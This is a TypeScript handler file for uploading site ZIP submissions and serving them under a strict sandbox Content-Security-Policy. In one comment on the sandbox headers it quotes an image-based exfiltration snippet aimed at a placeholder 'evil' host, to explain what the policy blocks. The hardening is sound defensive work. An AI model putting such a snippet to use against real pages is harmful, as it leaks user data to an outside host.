/**
 * T1 site submission handlers — framework-agnostic, same (context, input) →
 * result convention as ../handlers.ts.
 *
 * Upload: validate the ZIP (pure), store the content-addressed snapshot, and
 * record the submission as an append-only `responses` row whose payload
 * carries the snapshot digest — the row is what makes the score recomputable
 * from stored inputs. ONE site submission per attempt: re-uploading the same
 * bytes is an idempotent replay; different bytes are rejected (409), matching
 * finalize semantics on the append-only store.
 *
 * Serve: unauthenticated capability URL keyed by the digest (a 256-bit opaque
 * token, unguessable — the phase-3 stand-in for spec §12's per-submission
 * opaque origin). Every response carries the sandbox CSP below.
 */

import type { ApiContext, ApiResult } from "../handlers.js";
import { withParticipant } from "../handlers.js";
import { appendResponse, getAttempt } from "../store.js";
import type { HeaderMap } from "../auth.js";
import { T1_SITE_RESPONSE_KIND, canonicalSitePath, siteUrlPath } from "../site-url.js";
import { SnapshotError, type SnapshotErrorCode } from "./errors.js";
import { SNAPSHOT_DIGEST_RE, snapshotFromZip } from "./snapshot.js";
import type { SnapshotStore } from "./storage.js";

export { T1_SITE_RESPONSE_KIND };

export interface T1ApiContext extends ApiContext {
  snapshots: SnapshotStore;
}

/** Size violations are 413; every other rejection is a plain 400. */
const OVERSIZE_CODES: ReadonlySet<SnapshotErrorCode> = new Set([
  "too_many_files",
  "file_too_large",
  "total_too_large",
]);

function snapshotErrorResult(err: SnapshotError): ApiResult {
  return {
    status: OVERSIZE_CODES.has(err.code) ? 413 : 400,
    body: { error: { code: err.code, message: err.message } },
  };
}

export interface UploadSiteInput {
  /** Raw ZIP bytes — the request body, not JSON. */
  zip: Uint8Array;
  /** Session-log sequence number, same convention as other responses. */
  seq: number;
  clientTs: string | number;
}

/** POST /api/attempts/:id/site — body: ZIP bytes; ?seq= & x-ailx-client-ts. */
export async function handleUploadSite(
  ctx: T1ApiContext,
  headers: HeaderMap,
  attemptId: string,
  input: UploadSiteInput,
): Promise<ApiResult> {
  return withParticipant(ctx, headers, async (participantId) => {
    if (!(input.zip instanceof Uint8Array) || input.zip.length === 0) {
      return { status: 400, body: { error: { code: "bad_request", message: "request body must be the site ZIP bytes" } } };
    }

    // Ownership first (404 for other people's attempts — no existence leak),
    // before spending CPU on a stranger's 25 MB archive.
    const attempt = await getAttempt(ctx.db, attemptId, participantId);
    if (attempt === null) {
      return { status: 404, body: { error: { code: "not_found", message: "attempt not found" } } };
    }

    let snapshot;
    try {
      snapshot = snapshotFromZip(input.zip);
    } catch (err) {
      if (err instanceof SnapshotError) return snapshotErrorResult(err);
      throw err;
    }

    // One submission per attempt. Best-effort pre-check; the append-only
    // store means a lost race leaves two rows rather than an overwrite, and
    // scoring reads the FIRST snapshot row deterministically.
    const { rows } = await ctx.db.query(
      `SELECT payload->>'digest' AS digest FROM responses
       WHERE attempt_id = $1 AND payload->>'kind' = $2
       ORDER BY seq LIMIT 1`,
      [attemptId, T1_SITE_RESPONSE_KIND],
    );
    const existing = rows[0]?.digest as string | undefined;
    if (existing !== undefined && existing !== snapshot.digest) {
      return {
        status: 409,
        body: {
          error: {
            code: "already_submitted",
            message: "attempt already has a site submission — submissions are append-only",
          },
        },
      };
    }

    // Store bytes BEFORE the DB row: a recorded digest must always resolve.
    await ctx.snapshots.put(snapshot);

    const result = await appendResponse(ctx.db, attemptId, participantId, {
      seq: input.seq,
      clientTs: input.clientTs,
      payload: {
        kind: T1_SITE_RESPONSE_KIND,
        digest: snapshot.digest,
        fileCount: snapshot.fileCount,
        totalBytes: snapshot.totalBytes,
      },
    });
    return {
      status: result.created ? 201 : 200,
      body: {
        submission: {
          responseId: result.id,
          created: result.created,
          digest: snapshot.digest,
          fileCount: snapshot.fileCount,
          totalBytes: snapshot.totalBytes,
          path: siteUrlPath(snapshot.digest),
        },
      },
    };
  });
}

/**
 * Sandbox headers for every served submission byte — spec §12. `origin` is
 * the serving origin, listed explicitly because CSP `'self'` does not match
 * the opaque origin that `sandbox` induces.
 *
 *  - `sandbox allow-scripts` (no allow-same-origin): IN THE HEADER, so even a
 *    top-level open gets an opaque origin — no cookies, storage, or
 *    credentialed same-origin fetches against our app, ever.
 *  - `connect-src 'none'`: the exfiltration kill switch — no fetch/XHR/
 *    WebSocket/EventSource/sendBeacon. `webrtc 'block'` closes data channels.
 *  - `img/media/font/style/script-src` limited to the snapshot's own origin
 *    (+ data:/blob: for inline assets, which cannot exfiltrate): closes
 *    `new Image().src = "https://evil/?"+data`.
 *  - `form-action 'none'`: a hosted phishing page can submit nothing.
 *  - `base-uri 'none'`, `object-src 'none'`, `frame-src 'none'`,
 *    `worker-src 'none'`: no base-tag redirection, plugins, nested frames, or
 *    worker-based CPU burn.
 *  - `nosniff` + served-from-allowlist content types; `no-referrer` so URLs
 *    of other app pages never leak into a submission; `noindex` (§12
 *    phishing row); immutable caching is safe because URLs are content-addressed.
 */
export function sandboxHeaders(origin: string, contentType: string): Record<string, string> {
  return {
    "content-type": contentType,
    "content-security-policy": [
      "sandbox allow-scripts",
      "default-src 'none'",
      `script-src 'self' ${origin}`,
      `style-src 'self' ${origin} 'unsafe-inline'`,
      `img-src 'self' ${origin} data: blob:`,
      `media-src 'self' ${origin}`,
      `font-src 'self' ${origin} data:`,
      `manifest-src 'self' ${origin}`,
      "connect-src 'none'",
      "webrtc 'block'",
      "form-action 'none'",
      "base-uri 'none'",
      "object-src 'none'",
      "frame-src 'none'",
      "worker-src 'none'",
    ].join("; "),
    "x-content-type-options": "nosniff",
    "referrer-policy": "no-referrer",
    "x-robots-tag": "noindex",
    "cache-control": "public, max-age=31536000, immutable",
  };
}

export interface ServeSiteResult {
  status: number;
  headers: Record<string, string>;
  /** null on 404. */
  data: Uint8Array | null;
}

const NOT_FOUND: ServeSiteResult = {
  status: 404,
  headers: { "content-type": "text/plain; charset=utf-8" },
  data: null,
};

/**
 * GET /api/site/:digest/*path — no auth: the digest IS the capability.
 * Directory-ish paths resolve to index.html via the shared canonicalSitePath
 * rule (the HTTP route redirects them there instead, so the browser's base URL
 * matches what it asked for); anything not listed in the snapshot manifest
 * (including traversal junk) is a 404 by construction.
 */
export async function handleServeSite(
  store: SnapshotStore,
  origin: string,
  digest: string,
  rawPath: string,
): Promise<ServeSiteResult> {
  if (!SNAPSHOT_DIGEST_RE.test(digest)) return NOT_FOUND;
  const path = canonicalSitePath(rawPath);
  const file = await store.getFile(digest, path);
  if (file === null) return NOT_FOUND;
  return { status: 200, headers: sandboxHeaders(origin, file.contentType), data: file.data };
}
